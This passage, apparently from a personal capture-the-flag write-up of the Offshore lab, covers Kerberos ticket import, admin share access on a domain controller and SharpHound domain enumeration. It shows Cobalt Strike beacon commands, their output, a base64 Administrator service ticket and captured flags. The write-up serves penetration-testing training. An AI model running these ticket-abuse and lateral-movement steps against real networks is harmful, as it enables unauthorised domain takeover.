[*] base64(ticket.kirbi) for SPN 'cifs/dc04.client.offshore.com':      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

[+] Ticket successfully imported!
```
this command created the TGT as well as began utilizing it, we can check cached tickets by utilizing the command below.
```powershell


[02/21 19:33:10] beacon> run klist
[02/21 19:33:10] [*] Tasked beacon to run: klist
[02/21 19:33:10] [+] host called home, sent: 23 bytes
[02/21 19:33:10] [+] received output:


Current LogonId is 0:0x3e7

Cached Tickets: (1)

#0>	Client: Administrator @ CLIENT.OFFSHORE.COM
	Server: cifs/dc04.client.offshore.com @ CLIENT.OFFSHORE.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize 
	Start Time: 2/21/2024 19:32:37 (local)
	End Time:   2/22/2024 5:32:37 (local)
	Renew Time: 2/28/2024 19:32:37 (local)
	Session Key Type: AES-128-CTS-HMAC-SHA1-96
	Cache Flags: 0 
	Kdc Called: 
```
once the ticket is imported we are able to remotely access `dc04.client.offshore.com`
```powershell
[02/21 19:34:01] beacon> ls \\dc04.client.offshore.com\c$\users\Administrator\
[02/21 19:34:01] [*] Tasked beacon to list files in \\dc04.client.offshore.com\c$\users\Administrator\
[02/21 19:34:01] [+] host called home, sent: 67 bytes
[02/21 19:34:01] [+] Location: \\dc04.client.offshore.com\c$\users\Administrator\*
```
![[Pasted image 20240221211421.png]]
and grab the flag
```powershell
[02/21 19:35:06] beacon> shell type \\dc04.client.offshore.com\c$\users\Administrator\Desktop\flag.txt
[02/21 19:35:07] [*] Tasked beacon to run: type \\dc04.client.offshore.com\c$\users\Administrator\Desktop\flag.txt
[02/21 19:35:07] [+] host called home, sent: 102 bytes
[02/21 19:35:07] [+] received output:
OFFSHORE{c@r3ful_who_y0u_d3legate_t0}
```
![[Pasted image 20240221211508.png]]
# Your Eyes aren't deceiving you.
used sharphound to collect information from `Client.offshore.com` domain and `Admin.Offshore.com`

```powershell
beacon> execute-assembly /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe -c all --domain client.offshore.com
```

```powershell
execute-assembly /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe -c all --domain admin.offshore.com
```
saved in this location on `linux` desktop
![[Pasted image 20240219193447.png]]
lookup groups associated with `CLIENT.OFFSHORE.COM` domain and find the `KEY_ADMINS@CLIENT.OFFSHORE.COM`
![[Pasted image 20240219194439.png]]
found flag `Your Eyes Arent deceiving you`
`OFFSHORE{h1dd3n_1n_pl@iN_$1ght}`


